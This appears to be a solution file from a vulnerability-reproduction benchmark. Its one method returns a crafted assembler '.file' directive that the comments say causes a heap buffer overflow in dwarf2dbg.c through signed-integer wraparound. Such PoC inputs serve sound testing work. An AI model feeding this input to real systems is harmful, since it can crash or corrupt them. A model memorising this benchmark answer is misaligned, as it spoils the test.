import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description identifies a heap buffer overflow in dwarf2dbg.c
        # triggered by a large integer in the .file directive, specifically 4294967289.
        # This value (0xFFFFFFF9) is interpreted as a negative index (-7) when treated as signed,
        # bypassing bounds checks and causing an out-of-bounds write.
        return b'.file 4294967289 "a"\n'